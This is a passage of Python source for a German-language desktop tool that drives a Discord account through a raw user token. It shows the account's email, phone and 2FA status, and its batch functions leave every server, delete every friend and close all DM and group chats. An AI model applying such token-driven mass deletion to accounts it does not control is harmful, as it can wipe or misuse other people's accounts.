"Token"]:\n            p_lbl = ctk.CTkLabel(pill_box, text=p_name, font=("Segoe UI", 10, "bold"), text_color=C["text_sub"], padx=10, pady=4)\n            p_lbl.pack(side="left")\n\n        rows = [\n            ("E-Mail Adresse:", u.get("email") or "- (Nicht oeffentlich)", "Verifiziert" if ver else "Nein"),\n            ("Telefonnummer:", u.get("phone") or "- (Keine hinterlegt)", "Aktiv" if u.get("phone") else "-"),\n            ("Sprache & Region:", f"{u.get(\'locale\', \'de\').upper()} (Discord)", "DE"),\n            ("2FA Authenticator:", "Aktiviert (MFA)" if mfa else "Deaktiviert", "2FA"),\n            ("Erstellungsdatum:", f"{dt_str} ({age_str})", f"{days_num} Tage"),\n            ("Verbundene Server:", f"{len(self.guilds_data)} Server ({owned_guilds} Inhaber)", f"{len(self.guilds_data)} Total"),\n            ("Freunde & Gruppen:", f"{len(self.friends_data)} Kontakte synchronisiert", f"{len(self.friends_data)} Total")\n        ]\n\n        dc_content = ctk.CTkFrame(detail_card, fg_color="transparent")\n        dc_content.pack(fill="x", padx=20, pady=(0, 18))\n\n        for lbl, val, tag in rows:\n            r_box = ctk.CTkFrame(dc_content, fg_color=C["card_alt"], corner_radius=12, height=38)\n            r_box.pack(fill="x", pady=3)\n            r_box.pack_propagate(False)\n\n            ctk.CTkLabel(r_box, text=lbl, font=("Segoe UI", 11, "bold"), text_color=C["text_muted"]).pack(side="left", padx=14)\n            ctk.CTkLabel(r_box, text=val, font=("Segoe UI", 11), text_color=C["text"]).pack(side="left", padx=6)\n            ctk.CTkLabel(r_box, text=tag, font=("Segoe UI", 9.5, "bold"), text_color=C["text_sub"], fg_color=C["card"], corner_radius=8, padx=10, pady=2).pack(side="right", padx=12)\n\n    def _populate_accent_card(self, parent, subtitle, main_val, footer_txt, accent_color, small=False, action_btn=None):\n        p_inner = ctk.CTkFrame(parent, fg_color="transparent")\n        p_inner.pack(fill="both", expand=True, padx=16, pady=14 if not small else 12)\n\n        top_row = ctk.CTkFrame(p_inner, fg_color="transparent")\n        top_row.pack(fill="x")\n\n        ctk.CTkLabel(top_row, text=subtitle, font=("Segoe UI", 9.5, "bold"), text_color=accent_color).pack(side="left")\n\n        ctk.CTkLabel(p_inner, text=main_val, font=("Segoe UI", 18 if not small else 14, "bold"), text_color=C["text"]).pack(anchor="w", pady=(4, 2))\n        ctk.CTkLabel(p_inner, text=footer_txt, font=("Segoe UI", 9.5), text_color=C["text_sub"]).pack(anchor="w")\n\n        if action_btn:\n            b_text, b_cmd, b_border, b_color = action_btn\n            btn = ctk.CTkButton(\n                p_inner,\n                text=b_text,\n                font=("Segoe UI", 9.5, "bold"),\n                fg_color="transparent",\n                hover_color=C["card_hover"],\n                border_color=b_border,\n                border_width=1,\n                text_color=b_color,\n                height=26,\n                corner_radius=8,\n                command=b_cmd\n            )\n            btn.pack(anchor="w", pady=(8, 0))\n\n    # --------------------------------------------------------------------------\n    # 3. SERVER TAB\n    # --------------------------------------------------------------------------\n    def _build_guilds_tab(self):\n        top_bar = ctk.CTkFrame(self.frame_guilds, fg_color=C["card"], corner_radius=16, border_width=1, border_color=C["card_border"])\n        top_bar.pack(fill="x", pady=(0, 10))\n\n        tb_row1 = ctk.CTkFrame(top_bar, fg_color="transparent")\n        tb_row1.pack(fill="x", padx=16, pady=(12, 6))\n\n        title_box = ctk.CTkFrame(tb_row1, fg_color="transparent")\n        title_box.pack(side="left")\n\n        self.lbl_guilds_title = ctk.CTkLabel(\n            title_box,\n            text=f"Verbundene Server ({len(self.guilds_data)})",\n            font=("Segoe UI", 15, "bold"),\n            text_color=C["text"]\n        )\n        self.lbl_guilds_title.pack(side="left")\n\n        self.lbl_selected_count = ctk.CTkLabel(\n            title_box,\n            text="(0 ausgewaehlt)",\n            font=("Segoe UI", 10.5),\n            text_color=C["text_muted"]\n        )\n        self.lbl_selected_count.pack(side="left", padx=(10, 0))\n\n        self.guild_search_var = ctk.StringVar()\n        self.guild_search_var.trace_add("write", lambda *args: self._filter_guilds())\n\n        search_entry = ctk.CTkEntry(\n            tb_row1,\n            textvariable=self.guild_search_var,\n            placeholder_text="Server nach Name oder ID filtern...",\n            width=260,\n            height=32,\n            corner_radius=10,\n            fg_color=C["card_alt"],\n            border_color=C["card_border"],\n            text_color=C["text"]\n        )\n        search_entry.pack(side="right", padx=(10, 0))\n\n        btn_refresh = ctk.CTkButton(\n            tb_row1,\n            text="Aktualisieren",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=10,\n            height=32,\n            width=100,\n            command=self._refresh_guilds_data\n        )\n        btn_refresh.pack(side="right")\n\n        tb_row2 = ctk.CTkFrame(top_bar, fg_color="transparent")\n        tb_row2.pack(fill="x", padx=16, pady=(4, 12))\n\n        sel_box = ctk.CTkFrame(tb_row2, fg_color="transparent")\n        sel_box.pack(side="left")\n\n        btn_sel_all = ctk.CTkButton(\n            sel_box,\n            text="Alle markieren",\n            font=("Segoe UI", 9.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            width=105,\n            command=self._select_all_guilds\n        )\n        btn_sel_all.pack(side="left", padx=(0, 6))\n\n        btn_sel_none = ctk.CTkButton(\n            sel_box,\n            text="Keine",\n            font=("Segoe UI", 9.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            width=60,\n            command=self._deselect_all_guilds\n        )\n        btn_sel_none.pack(side="left")\n\n        act_box = ctk.CTkFrame(tb_row2, fg_color="transparent")\n        act_box.pack(side="right")\n\n        self.btn_stop_leave = ctk.CTkButton(\n            act_box,\n            text="Stop",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["btn_gray"],\n            text_color=C["text_muted"],\n            hover_color=C["red_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            width=65,\n            state="disabled",\n            command=self._stop_batch_leave\n        )\n        self.btn_stop_leave.pack(side="right", padx=(8, 0))\n\n        btn_leave_all = ctk.CTkButton(\n            act_box,\n            text="Alle Server verlassen",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            command=self._leave_all_guilds\n        )\n        btn_leave_all.pack(side="right", padx=(8, 0))\n\n        self.btn_leave_selected = ctk.CTkButton(\n            act_box,\n            text="Ausgewaehlte verlassen (0)",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            command=self._leave_selected_guilds\n        )\n        self.btn_leave_selected.pack(side="right")\n\n        self.guilds_scroll = ctk.CTkScrollableFrame(self.frame_guilds, fg_color="transparent")\n        self.guilds_scroll.pack(fill="both", expand=True)\n\n        self._render_all_guilds_cards()\n\n    def _render_all_guilds_cards(self):\n        for widget in self.guilds_scroll.winfo_children():\n            widget.destroy()\n\n        self.guild_cards.clear()\n        self.guild_checkboxes.clear()\n\n        if not self.guilds_data:\n            empty_box = ctk.CTkFrame(self.guilds_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])\n            empty_box.pack(fill="x", pady=20)\n            ctk.CTkLabel(empty_box, text="Keine Server vorhanden.", font=("Segoe UI", 12), text_color=C["text_muted"]).pack(pady=24)\n            return\n\n        for g in self.guilds_data:\n            gid = str(g.get("id", "0"))\n            gname = g.get("name", "Unbekannter Server")\n            is_owner = g.get("owner", False)\n\n            card = ctk.CTkFrame(self.guilds_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])\n            card.pack(fill="x", pady=3)\n            self.guild_cards[gid] = card\n\n            ci = ctk.CTkFrame(card, fg_color="transparent")\n            ci.pack(fill="x", padx=16, pady=8)\n\n            if not is_owner:\n                chk_var = ctk.BooleanVar(value=False)\n                self.guild_checkboxes[gid] = chk_var\n                chk = ctk.CTkCheckBox(\n                    ci,\n                    text="",\n                    variable=chk_var,\n                    width=22,\n                    checkbox_width=18,\n                    checkbox_height=18,\n                    corner_radius=4,\n                    border_width=1.5,\n                    border_color=C["card_border_hi"],\n                    fg_color=C["blurple"],\n                    hover_color=C["blurple_hi"],\n                    command=self._update_selected_count\n                )\n                chk.pack(side="left", padx=(0, 8))\n            else:\n                spacer = ctk.CTkFrame(ci, width=22, height=18, fg_color="transparent")\n                spacer.pack(side="left", padx=(0, 8))\n\n            g_initial = (gname[:1] or "S").upper()\n            icon_badge = ctk.CTkLabel(ci, text=g_initial, font=("Segoe UI", 12, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)\n            icon_badge.pack(side="left", padx=(0, 12))\n\n            title_col = ctk.CTkFrame(ci, fg_color="transparent")\n            title_col.pack(side="left", fill="x", expand=True)\n\n            ctk.CTkLabel(title_col, text=gname, font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")\n            ctk.CTkLabel(title_col, text=f"ID: {gid}", font=("Consolas", 9.5), text_color=C["text_muted"]).pack(anchor="w")\n\n            if is_owner:\n                badge = ctk.CTkLabel(ci, text="Inhaber", font=("Segoe UI", 9.5, "bold"), fg_color=C["acc_yellow_bg"], text_color=C["acc_yellow_text"], corner_radius=8, padx=10, pady=4)\n                badge.pack(side="right", padx=(10, 0))\n            else:\n                badge = ctk.CTkLabel(ci, text="Mitglied", font=("Segoe UI", 9.5, "bold"), fg_color=C["card_alt"], text_color=C["text_sub"], corner_radius=8, padx=10, pady=4)\n                badge.pack(side="right", padx=(10, 0))\n\n                btn_leave = ctk.CTkButton(\n                    ci,\n                    text="Verlassen",\n                    font=("Segoe UI", 10.5, "bold"),\n                    fg_color=C["red_bg"],\n                    text_color=C["red_text"],\n                    hover_color=C["red_hover"],\n                    border_color=C["red_border"],\n                    border_width=1,\n                    height=30,\n                    corner_radius=8,\n                    command=lambda i=gid, n=gname: self._leave_guild_direct(i, n)\n                )\n                btn_leave.pack(side="right", padx=(10, 0))\n\n        self._update_selected_count()\n\n    def _update_selected_count(self):\n        cnt = sum(1 for var in self.guild_checkboxes.values() if var.get())\n        if hasattr(self, "lbl_selected_count"):\n            self.lbl_selected_count.configure(text=f"({cnt} ausgewaehlt)")\n        if hasattr(self, "btn_leave_selected"):\n            self.btn_leave_selected.configure(text=f"Ausgewaehlte verlassen ({cnt})")\n\n    def _select_all_guilds(self):\n        for var in self.guild_checkboxes.values():\n            var.set(True)\n        self._update_selected_count()\n\n    def _deselect_all_guilds(self):\n        for var in self.guild_checkboxes.values():\n            var.set(False)\n        self._update_selected_count()\n\n    def _filter_guilds(self):\n        query = self.guild_search_var.get().strip().lower()\n        for g in self.guilds_data:\n            gid = str(g.get("id", "0"))\n            card = self.guild_cards.get(gid)\n            if not card:\n                continue\n            gname = str(g.get("name", "")).lower()\n            matches = not query or (query in gname or query in gid)\n            if matches:\n                if not card.winfo_ismapped():\n                    card.pack(fill="x", pady=3)\n            else:\n                if card.winfo_ismapped():\n                    card.pack_forget()\n\n    def _remove_single_guild_ui(self, guild_id):\n        gid_str = str(guild_id)\n        card = self.guild_cards.pop(gid_str, None)\n        self.guild_checkboxes.pop(gid_str, None)\n        if card:\n            try: card.destroy()\n            except Exception: pass\n        self.guilds_data = [g for g in self.guilds_data if str(g.get("id")) != gid_str]\n        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})")\n        self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})")\n        self._update_selected_count()\n        self._update_extra_guild_options()\n\n    def _leave_guild_direct(self, guild_id, guild_name):\n        self._remove_single_guild_ui(guild_id)\n        def _do_leave():\n            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:\n                return\n            make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/guilds/{guild_id}", self.token)\n        threading.Thread(target=_do_leave, daemon=True).start()\n\n    def _leave_selected_guilds(self):\n        selected_ids = [gid for gid, var in self.guild_checkboxes.items() if var.get()]\n        if not selected_ids:\n            return\n        self._batch_leave_guilds(selected_ids)\n\n    def _leave_all_guilds(self):\n        all_member_ids = [str(g.get("id")) for g in self.guilds_data if not g.get("owner")]\n        if not all_member_ids:\n            return\n        self._batch_leave_guilds(all_member_ids)\n\n    def _stop_batch_leave(self):\n        self.stop_requested = True\n        if hasattr(self, "btn_stop_leave"):\n            self.btn_stop_leave.configure(text="Stoppe...", state="disabled")\n\n    def _batch_leave_guilds(self, guild_ids):\n        if self.leave_in_progress or not guild_ids:\n            return\n\n        self.leave_in_progress = True\n        self.stop_requested = False\n\n        if hasattr(self, "btn_stop_leave"):\n            self.btn_stop_leave.configure(\n                state="normal",\n                fg_color=C["red_bg"],\n                text_color=C["red_text"],\n                border_color=C["red_border"],\n                hover_color=C["red_hover"],\n                text="Stop"\n            )\n\n        def _worker():\n            for gid in list(guild_ids):\n                if self.stop_requested:\n                    break\n\n                self.after(0, lambda target=gid: self._remove_single_guild_ui(target))\n\n                if self.token and not self.token.startswith("mfa.VkO_") and "DEMO" not in self.token:\n                    make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/guilds/{gid}", self.token)\n                    for _ in range(5):\n                        if self.stop_requested:\n                            break\n                        time.sleep(0.04)\n                else:\n                    time.sleep(0.04)\n\n            self.leave_in_progress = False\n            self.stop_requested = False\n            self.after(0, lambda: self._on_batch_leave_finished())\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _on_batch_leave_finished(self):\n        if hasattr(self, "btn_stop_leave"):\n            self.btn_stop_leave.configure(\n                state="disabled",\n                fg_color=C["btn_gray"],\n                text_color=C["text_muted"],\n                border_color=C["btn_gray_border"],\n                text="Stop"\n            )\n\n    def _refresh_guilds_data(self):\n        if not self.token or "DEMO" in self.token:\n            self._render_all_guilds_cards()\n            return\n\n        def _fetch():\n            try:\n                rg = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/guilds", self.token)\n                if rg and rg.status_code == 200:\n                    self.guilds_data = rg.json()\n                    self.after(0, lambda: [\n                        self.nav_btns["guilds"].configure(text=f"Server ({len(self.guilds_data)})"),\n                        self.lbl_guilds_title.configure(text=f"Verbundene Server ({len(self.guilds_data)})"),\n                        self._render_all_guilds_cards(),\n                        self._update_extra_guild_options()\n                    ])\n            except Exception:\n                pass\n\n        threading.Thread(target=_fetch, daemon=True).start()\n\n    # --------------------------------------------------------------------------\n    # 4. FREUNDE & GRUPPEN TAB (INCL. CHATS SCHLIESSEN)\n    # --------------------------------------------------------------------------\n    def _build_friends_tab(self):\n        top_bar = ctk.CTkFrame(self.frame_friends, fg_color=C["card"], corner_radius=16, border_width=1, border_color=C["card_border"])\n        top_bar.pack(fill="x", pady=(0, 10))\n\n        tb_row1 = ctk.CTkFrame(top_bar, fg_color="transparent")\n        tb_row1.pack(fill="x", padx=16, pady=(12, 6))\n\n        title_box = ctk.CTkFrame(tb_row1, fg_color="transparent")\n        title_box.pack(side="left")\n\n        self.lbl_friends_title = ctk.CTkLabel(\n            title_box,\n            text=f"Freunde & Gruppen ({len(self.friends_data)})",\n            font=("Segoe UI", 15, "bold"),\n            text_color=C["text"]\n        )\n        self.lbl_friends_title.pack(side="left")\n\n        self.lbl_friends_selected_count = ctk.CTkLabel(\n            title_box,\n            text="(0 ausgewaehlt)",\n            font=("Segoe UI", 10.5),\n            text_color=C["text_muted"]\n        )\n        self.lbl_friends_selected_count.pack(side="left", padx=(10, 0))\n\n        self.friends_search_var = ctk.StringVar()\n        self.friends_search_var.trace_add("write", lambda *args: self._filter_friends())\n\n        search_entry = ctk.CTkEntry(\n            tb_row1,\n            textvariable=self.friends_search_var,\n            placeholder_text="Freunde oder Gruppen filtern...",\n            width=260,\n            height=32,\n            corner_radius=10,\n            fg_color=C["card_alt"],\n            border_color=C["card_border"],\n            text_color=C["text"]\n        )\n        search_entry.pack(side="right", padx=(10, 0))\n\n        btn_refresh = ctk.CTkButton(\n            tb_row1,\n            text="Aktualisieren",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=10,\n            height=32,\n            width=100,\n            command=self._refresh_friends_data\n        )\n        btn_refresh.pack(side="right")\n\n        tb_row2 = ctk.CTkFrame(top_bar, fg_color="transparent")\n        tb_row2.pack(fill="x", padx=16, pady=(4, 12))\n\n        sel_box = ctk.CTkFrame(tb_row2, fg_color="transparent")\n        sel_box.pack(side="left")\n\n        btn_sel_all = ctk.CTkButton(\n            sel_box,\n            text="Alle markieren",\n            font=("Segoe UI", 9.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            width=105,\n            command=self._select_all_friends\n        )\n        btn_sel_all.pack(side="left", padx=(0, 6))\n\n        btn_sel_none = ctk.CTkButton(\n            sel_box,\n            text="Keine",\n            font=("Segoe UI", 9.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            width=60,\n            command=self._deselect_all_friends\n        )\n        btn_sel_none.pack(side="left")\n\n        act_box = ctk.CTkFrame(tb_row2, fg_color="transparent")\n        act_box.pack(side="right")\n\n        self.btn_stop_friends = ctk.CTkButton(\n            act_box,\n            text="Stop",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["btn_gray"],\n            text_color=C["text_muted"],\n            hover_color=C["red_hover"],\n            border_color=C["btn_gray_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            width=65,\n            state="disabled",\n            command=self._stop_batch_friends\n        )\n        self.btn_stop_friends.pack(side="right", padx=(8, 0))\n\n        btn_remove_all = ctk.CTkButton(\n            act_box,\n            text="Alle Freunde entfernen",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            command=self._remove_all_friends\n        )\n        btn_remove_all.pack(side="right", padx=(8, 0))\n\n        self.btn_remove_selected = ctk.CTkButton(\n            act_box,\n            text="Ausgewaehlte entfernen (0)",\n            font=("Segoe UI", 10, "bold"),\n            fg_color=C["red_bg"],\n            text_color=C["red_text"],\n            hover_color=C["red_hover"],\n            border_color=C["red_border"],\n            border_width=1,\n            corner_radius=8,\n            height=28,\n            command=self._remove_selected_friends\n        )\n        self.btn_remove_selected.pack(side="right")\n\n        self.friends_scroll = ctk.CTkScrollableFrame(self.frame_friends, fg_color="transparent")\n        self.friends_scroll.pack(fill="both", expand=True)\n\n        self._render_all_friends_cards()\n\n    def _render_all_friends_cards(self):\n        for widget in self.friends_scroll.winfo_children():\n            widget.destroy()\n\n        self.friend_cards.clear()\n        self.friend_checkboxes.clear()\n\n        if not self.friends_data:\n            empty_box = ctk.CTkFrame(self.friends_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])\n            empty_box.pack(fill="x", pady=20)\n            ctk.CTkLabel(empty_box, text="Keine Freunde oder Gruppen vorhanden.", font=("Segoe UI", 12), text_color=C["text_muted"]).pack(pady=24)\n            return\n\n        for item in self.friends_data:\n            fid = str(item.get("id", "0"))\n            fname = item.get("name", "Unbekannt")\n            sub_info = item.get("username", "")\n            type_lbl = item.get("type_name", "Freund")\n            is_group = item.get("is_group", False)\n            tag = "GR" if is_group else ("DM" if type_lbl == "DM" else "FR")\n\n            card = ctk.CTkFrame(self.friends_scroll, fg_color=C["card"], corner_radius=14, border_width=1, border_color=C["card_border"])\n            card.pack(fill="x", pady=3)\n            self.friend_cards[fid] = card\n\n            ci = ctk.CTkFrame(card, fg_color="transparent")\n            ci.pack(fill="x", padx=16, pady=8)\n\n            chk_var = ctk.BooleanVar(value=False)\n            self.friend_checkboxes[fid] = chk_var\n            chk = ctk.CTkCheckBox(\n                ci,\n                text="",\n                variable=chk_var,\n                width=22,\n                checkbox_width=18,\n                checkbox_height=18,\n                corner_radius=4,\n                border_width=1.5,\n                border_color=C["card_border_hi"],\n                fg_color=C["blurple"],\n                hover_color=C["blurple_hi"],\n                command=self._update_selected_friends_count\n            )\n            chk.pack(side="left", padx=(0, 8))\n\n            icon_badge = ctk.CTkLabel(ci, text=tag, font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=36, height=36, fg_color=C["card_alt"], corner_radius=18)\n            icon_badge.pack(side="left", padx=(0, 12))\n\n            title_col = ctk.CTkFrame(ci, fg_color="transparent")\n            title_col.pack(side="left", fill="x", expand=True)\n\n            ctk.CTkLabel(title_col, text=fname, font=("Segoe UI", 12, "bold"), text_color=C["text"]).pack(anchor="w")\n            ctk.CTkLabel(title_col, text=f"{sub_info}  |  ID: {fid}", font=("Consolas", 9.5), text_color=C["text_muted"]).pack(anchor="w")\n\n            badge = ctk.CTkLabel(\n                ci,\n                text=type_lbl,\n                font=("Segoe UI", 9.5, "bold"),\n                fg_color=C["card_alt"],\n                text_color=C["text_sub"],\n                corner_radius=8,\n                padx=10,\n                pady=4\n            )\n            badge.pack(side="right", padx=(10, 0))\n\n            btn_rem = ctk.CTkButton(\n                ci,\n                text="Verlassen" if is_group else "Entfernen",\n                font=("Segoe UI", 10.5, "bold"),\n                fg_color=C["red_bg"],\n                text_color=C["red_text"],\n                hover_color=C["red_hover"],\n                border_color=C["red_border"],\n                border_width=1,\n                height=30,\n                corner_radius=8,\n                command=lambda i=fid, g=is_group: self._remove_friend_direct(i, g)\n            )\n            btn_rem.pack(side="right", padx=(10, 0))\n\n        self._update_selected_friends_count()\n\n    def _update_selected_friends_count(self):\n        cnt = sum(1 for var in self.friend_checkboxes.values() if var.get())\n        if hasattr(self, "lbl_friends_selected_count"):\n            self.lbl_friends_selected_count.configure(text=f"({cnt} ausgewaehlt)")\n        if hasattr(self, "btn_remove_selected"):\n            self.btn_remove_selected.configure(text=f"Ausgewaehlte entfernen ({cnt})")\n\n    def _select_all_friends(self):\n        for var in self.friend_checkboxes.values():\n            var.set(True)\n        self._update_selected_friends_count()\n\n    def _deselect_all_friends(self):\n        for var in self.friend_checkboxes.values():\n            var.set(False)\n        self._update_selected_friends_count()\n\n    def _filter_friends(self):\n        query = self.friends_search_var.get().strip().lower()\n        for f in self.friends_data:\n            fid = str(f.get("id", "0"))\n            card = self.friend_cards.get(fid)\n            if not card:\n                continue\n            fname = str(f.get("name", "")).lower()\n            fuser = str(f.get("username", "")).lower()\n            matches = not query or (query in fname or query in fuser or query in fid)\n            if matches:\n                if not card.winfo_ismapped():\n                    card.pack(fill="x", pady=3)\n            else:\n                if card.winfo_ismapped():\n                    card.pack_forget()\n\n    def _remove_single_friend_ui(self, item_id):\n        fid_str = str(item_id)\n        card = self.friend_cards.pop(fid_str, None)\n        self.friend_checkboxes.pop(fid_str, None)\n        if card:\n            try: card.destroy()\n            except Exception: pass\n        self.friends_data = [f for f in self.friends_data if str(f.get("id")) != fid_str]\n        self.nav_btns["friends"].configure(text=f"Freunde & Gruppen ({len(self.friends_data)})")\n        self.lbl_friends_title.configure(text=f"Freunde & Gruppen ({len(self.friends_data)})")\n        self._update_selected_friends_count()\n\n    def _remove_friend_direct(self, item_id, is_group):\n        self._remove_single_friend_ui(item_id)\n        def _do_remove():\n            if not self.token or self.token.startswith("mfa.VkO_") or "DEMO" in self.token:\n                return\n\n            if is_group:\n                make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{item_id}", self.token)\n            else:\n                # 1. Freundschaft aufloesen\n                make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/relationships/{item_id}", self.token)\n\n                # 2. Chat (DM Channel) schliessen\n                dm_cid = self.user_to_channel_map.get(str(item_id))\n                if not dm_cid:\n                    try:\n                        res_open = make_discord_api_request("POST", "https://discord.com/api/v10/users/@me/channels", self.token, json_data={"recipient_id": str(item_id)})\n                        if res_open and res_open.status_code in (200, 201):\n                            dm_cid = res_open.json().get("id")\n                            if dm_cid:\n                                self.user_to_channel_map[str(item_id)] = str(dm_cid)\n                    except Exception:\n                        pass\n\n                if dm_cid:\n                    make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{dm_cid}", self.token)\n\n        threading.Thread(target=_do_remove, daemon=True).start()\n\n    def _remove_selected_friends(self):\n        selected_ids = [fid for fid, var in self.friend_checkboxes.items() if var.get()]\n        if not selected_ids:\n            return\n        self._batch_remove_friends(selected_ids)\n\n    def _remove_all_friends(self):\n        all_ids = [str(f.get("id")) for f in self.friends_data]\n        if not all_ids:\n            return\n        self._batch_remove_friends(all_ids)\n\n    def _stop_batch_friends(self):\n        self.friend_stop_requested = True\n        if hasattr(self, "btn_stop_friends"):\n            self.btn_stop_friends.configure(text="Stoppe...", state="disabled")\n\n    def _batch_remove_friends(self, ids_list):\n        if self.friend_leave_in_progress or not ids_list:\n            return\n\n        self.friend_leave_in_progress = True\n        self.friend_stop_requested = False\n\n        if hasattr(self, "btn_stop_friends"):\n            self.btn_stop_friends.configure(\n                state="normal",\n                fg_color=C["red_bg"],\n                text_color=C["red_text"],\n                border_color=C["red_border"],\n                hover_color=C["red_hover"],\n                text="Stop"\n            )\n\n        def _worker():\n            type_map = {str(f.get("id")): f.get("is_group", False) for f in self.friends_data}\n\n            for fid in list(ids_list):\n                if self.friend_stop_requested:\n                    break\n\n                is_group = type_map.get(str(fid), False)\n                self.after(0, lambda target=fid: self._remove_single_friend_ui(target))\n\n                if self.token and not self.token.startswith("mfa.VkO_") and "DEMO" not in self.token:\n                    if is_group:\n                        make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{fid}", self.token)\n                    else:\n                        make_discord_api_request("DELETE", f"https://discord.com/api/v10/users/@me/relationships/{fid}", self.token)\n                        dm_cid = self.user_to_channel_map.get(str(fid))\n                        if not dm_cid:\n                            res_open = make_discord_api_request("POST", "https://discord.com/api/v10/users/@me/channels", self.token, json_data={"recipient_id": str(fid)})\n                            if res_open and res_open.status_code in (200, 201):\n                                dm_cid = res_open.json().get("id")\n                                if dm_cid:\n                                    self.user_to_channel_map[str(fid)] = str(dm_cid)\n                        if dm_cid:\n                            make_discord_api_request("DELETE", f"https://discord.com/api/v10/channels/{dm_cid}", self.token)\n\n                    for _ in range(5):\n                        if self.friend_stop_requested:\n                            break\n                        time.sleep(0.04)\n                else:\n                    time.sleep(0.04)\n\n            self.friend_leave_in_progress = False\n            self.friend_stop_requested = False\n            self.after(0, lambda: self._on_batch_friends_finished())\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _on_batch_friends_finished(self):\n        if hasattr(self, "btn_stop_friends"):\n            self.btn_stop_friends.configure(\n                state="disabled",\n                fg_color=C["btn_gray"],\n                text_color=C["text_muted"],\n                border_color=C["btn_gray_border"],\n                text="Stop"\n            )\n\n    def _refresh_friends_data(self):\n        if not self.token or "DEMO" in self.token:\n            self._render_all_friends_cards()\n            return\n\n        def _fetch():\n            try:\n                fresh = []\n                rf = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/relationships", self.token)\n                if rf and rf.status_code == 200:\n                    for r in rf.json():\n                        u_info = r.get("user", {})\n                        fresh.append({\n                            "id": str(r.get("id", u_info.get("id"))),\n                            "name": u_info.get("global_name") or u_info.get("username", "Freund"),\n                            "username": u_info.get("username", ""),\n                            "type_name": "Freund" if r.get("type") == 1 else ("Anfrage" if r.get("type") in (3, 4) else "Blockiert"),\n                            "is_group": False\n                        })\n                rc = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/channels", self.token)\n                if rc and rc.status_code == 200:\n                    for ch in rc.json():\n                        ch_type = ch.get("type")\n                        recips = ch.get("recipients", [])\n                        recip_names = ", ".join([rcp.get("username", "") for rcp in recips[:3]])\n                        if ch_type == 3:\n                            g_name = ch.get("name") or (f"Gruppe ({recip_names})" if recip_names else "Gruppe")\n                            fresh.append({\n                                "id": str(ch.get("id")),\n                                "name": g_name,\n                                "username": f"{len(recips)} Mitglieder",\n                                "type_name": "Gruppe",\n                                "is_group": True\n                            })\n                        elif ch_type == 1 and recips:\n                            dm_uid = str(recips[0].get("id"))\n                            self.user_to_channel_map[dm_uid] = str(ch.get("id"))\n                            if not any(f["id"] == dm_uid for f in fresh):\n                                fresh.append({\n                                    "id": str(ch.get("id")),\n                                    "name": recips[0].get("global_name") or recips[0].get("username", "DM"),\n                                    "username": recips[0].get("username", ""),\n                                    "type_name": "DM",\n                                    "is_group": True\n                                })\n                self.friends_data = fresh\n                self.after(0, lambda: [\n                    self.nav_btns["friends"].configure(text=f"Freunde & Gruppen ({len(self.friends_data)})"),\n                    self.lbl_friends_title.configure(text=f"Freunde & Gruppen ({len(self.friends_data)})"),\n                    self._render_all_friends_cards(),\n                    self._populate_quick_targets()\n                ])\n            except Exception:\n                pass\n\n        threading.Thread(target=_fetch, daemon=True).start()\n\n    # --------------------------------------------------------------------------\n    # 5. SERVER BEITRETEN TAB (Per Link oder Code)\n    # --------------------------------------------------------------------------\n    def _build_join_tab(self):\n        container = ctk.CTkFrame(self.frame_join, fg_color="transparent")\n        container.pack(fill="both", expand=True)\n\n        card = ctk.CTkFrame(container, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        card.pack(fill="x", pady=(0, 